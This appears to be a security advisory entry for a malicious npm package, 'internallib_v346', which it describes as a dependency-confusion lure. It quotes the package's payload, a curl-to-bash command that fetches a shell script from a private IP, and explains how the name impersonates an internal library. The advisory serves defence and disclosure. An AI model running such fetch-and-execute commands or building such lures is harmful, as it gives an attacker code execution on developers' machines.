summary: Dependency-confusion lure with curl|bash remote-code-execution payload
details: The package's main entrypoint index.js exports a single function command() whose body executes `curl http://10.0.56.229:9001/shell.sh | bash` via child_process.exec. Any consumer that requires this package and calls its only advertised API fetches an unverified shell script from a bare RFC1918 IP over plain HTTP and pipes it directly to bash, giving the operator of that endpoint arbitrary code execution on the installer's machine. The package metadata reinforces the offensive intent: author and description fields are empty, the name `internallib_v346` is shaped to impersonate an internal corporate library, and the shipped.gitlab-ci.yml references a Verdaccio private registry at http://0.0.0.0:4873/ — the canonical fingerprint of a dependency-confusion lure designed to be resolved from public npm in place of a same-named internal package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
